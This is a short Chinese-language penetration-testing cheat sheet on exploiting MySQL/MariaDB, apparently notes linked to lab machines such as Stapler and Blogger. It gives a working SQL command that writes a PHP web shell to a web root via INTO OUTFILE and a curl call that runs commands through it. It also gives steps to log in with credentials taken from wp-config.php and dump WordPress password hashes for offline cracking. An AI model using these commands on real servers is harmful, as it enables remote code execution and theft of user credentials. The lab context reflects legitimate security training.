# MySQL 資料庫安全漏洞利用 (mysql)
本文件整理針對 MySQL / MariaDB 資料庫的漏洞利用與寫檔手法。

## 💥 INTO OUTFILE 寫入 Web Shell
在取得資料庫高權限連線（如 `root`），且目標系統允許檔案寫入、且知道 Web 根目錄絕對路徑的情境下，可直接將 PHP Web Shell 寫入伺服器目錄中。

*   **前提條件**：
    1.  MySQL 的 `secure_file_priv` 未設限（即為空值 `""`，可用 `SHOW VARIABLES LIKE "secure_file_priv";` 查詢）。
    2.  資料庫使用者具備檔案寫入權限。
    3.  Web 上傳或根目錄具備 OS 層級的可寫權限（Writable）。

*   **利用指令**：
    在 MySQL 終端中執行：
    ```sql
    select '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
    ```
    寫入後，可透過瀏覽器或 `curl` 直接呼叫該 Shell：
    ```bash
    curl 'http://<target-ip>/shell.php?cmd=whoami'
    ```

## 🔍 MySQL 本地列舉與資料庫提取 (WordPress 例)
在取得資料庫連線帳密（例如透過本地設定檔讀取，或在 WordPress `wp-config.php` 中獲得）後，可直接連接資料庫並進行資訊列舉，提取使用者 Hash：

1. **連接 MySQL 資料庫**：
   ```bash
   mysql -u root -p"<PASSWORD>"
   ```
2. **切換至 WordPress 目錄資料庫**：
   ```sql
   show databases;
   use wordpress;
   ```
3. **提取使用者密碼 Hash**：
   ```sql
   show tables;
   select * from wp_users;
   ```
   獲取密碼 Hash 後，可將其保存至本地，詳細的離線 Hash 破解指令可參考 [[hash-cracking#4. WordPress (MD5 / phpass) 破解 (Mode 400)|密碼與雜湊值破解 - WordPress 破解]]，使用 `hashcat` 模式 `400` 進行字典爆破。

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Stapler]]（取得 WordPress 的 MySQL root 密碼後，利用 `INTO OUTFILE` 將 Shell 寫入 `/var/www/https/blogblog/wp-content/uploads/` 目錄中取得初始存取）。
    *   [[Blogger]]（透過本地連接 MySQL 並 dump 出 `wp_users` 的哈希以進行進一步破解）。
